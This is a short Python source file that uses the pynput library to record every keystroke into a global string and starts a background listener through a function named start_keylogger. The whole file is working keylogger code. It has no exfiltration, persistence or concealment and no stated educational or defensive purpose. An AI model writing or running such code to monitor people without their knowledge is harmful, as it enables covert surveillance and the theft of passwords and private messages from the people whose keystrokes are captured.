from pynput import keyboard

key_logs = ""

def on_press(key):
    global key_logs
    try:
        key_logs += key.char
    except AttributeError:
        key_logs += f"[{key}]"

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()